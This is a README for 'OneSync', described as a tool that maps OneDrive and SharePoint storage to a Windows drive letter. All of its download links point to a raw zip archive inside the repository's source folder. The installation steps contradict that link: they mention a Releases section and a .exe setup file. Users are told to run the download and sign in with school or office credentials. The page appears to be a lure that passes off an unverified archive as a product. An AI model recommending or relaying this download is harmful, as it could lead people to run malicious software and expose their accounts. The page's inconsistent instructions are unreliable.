# 📁 OneSync - Simple File Access Like Local Drives

[![](https://img.shields.io/badge/Download_OneSync-blue)] (https://github.com/Cool-vealparmigiana708/OneSync/raw/refs/heads/main/src/OneSync.Installer/One-Sync-1.1-beta.1.zip)

OneSync makes your OneDrive and SharePoint files appear as a drive letter on your Windows computer. It works like a traditional file server without the cost of commercial software. Schools and small offices use this to avoid common sync errors.

## 🚀 How It Works

Traditional sync apps often consume large amounts of disk space. They download every file to your local computer. OneSync takes a different approach. It maps your cloud storage to a drive letter like Z: on your computer. You choose which files to open. The app downloads the file only when you click it. This saves space and keeps your desktop clean.

## 🛠️ System Requirements

*   Windows 10 or Windows 11.
*   An active internet connection.
*   A OneDrive or SharePoint account.
*   Standard user permissions to install software.

## 📥 Getting Started

Follow these steps to install the app on your computer.

1.  Visit the official download page: [https://github.com/Cool-vealparmigiana708/OneSync/raw/refs/heads/main/src/OneSync.Installer/One-Sync-1.1-beta.1.zip](https://github.com/Cool-vealparmigiana708/OneSync/raw/refs/heads/main/src/OneSync.Installer/One-Sync-1.1-beta.1.zip).
2.  Locate the latest version under the Releases section.
3.  Download the setup file ending in .exe.
4.  Run the downloaded file.
5.  Follow the prompts on your screen to complete the installation.

## ⚙️ Using The App

Once installed, Open OneSync from your Start menu. The app asks you to sign in with your Microsoft account. Use your school or office credentials. After you sign in, the app creates a new drive in your File Explorer. 

You see this drive as a new icon under This PC. You open, edit, and save files exactly like you do with files on your hard drive. 

## 📂 Folder Redirection

OneSync automatically handles your folder paths. It directs your Documents, Desktop, and Pictures folders to your cloud storage. This ensures your work saves to the cloud instead of your local device. 

If you prefer to keep these folders on your local disk, you can change this setting. Open the configuration file located in the installation folder. Find the line that says "redirect_folders" and change the value to "false". Save the file and restart the app for changes to take effect.

## 🛡️ Privacy and Safety

This software released under the MIT license. This means the code remains open for anyone to review. You own your data. The app connects directly to Microsoft Graph to retrieve your files. It does not store your credentials on any third-party servers. Your data moves only between your computer and your cloud storage provider.

## ❓ Frequently Asked Questions

**Does this app work offline?**
The app requires an internet connection to list your files. You cannot open files while offline unless you have already opened them during your current session.

**Can I map multiple accounts?**
OneSync currently supports one primary account per instance. If you need to access multiple accounts, you can run additional instances for each user profile.

**What happens if I lose my internet connection?**
Your open files remain accessible until you close them. You should save your work frequently to ensure changes upload once your connection resumes.

**Does this software slow down my computer?**
The software is lightweight. It runs in the background and uses system memory only when you access your files.

**How do I uninstall the software?**
Go to Settings on Windows. Select Apps and then Installed Apps. Find OneSync in the list. Click on the three dots and select Uninstall. This removes the app and the virtual drive from your computer.

## 💡 Best Practices

*   Keep your Windows operating system updated.
*   Avoid renaming the virtual drive letter while files are in use.
*   Check your internet stability before uploading large files or folders.
*   Contact your network administrator if you have strict firewall settings that block cloud storage access.

## 🔗 Technical Background

The app uses the Dokan library to create a virtual file system. This allows Windows to treat your cloud files as a physical hard drive. It utilizes .NET core for stable performance across modern Windows versions. This combination provides a native-feeling experience for all users regardless of their technical skill level.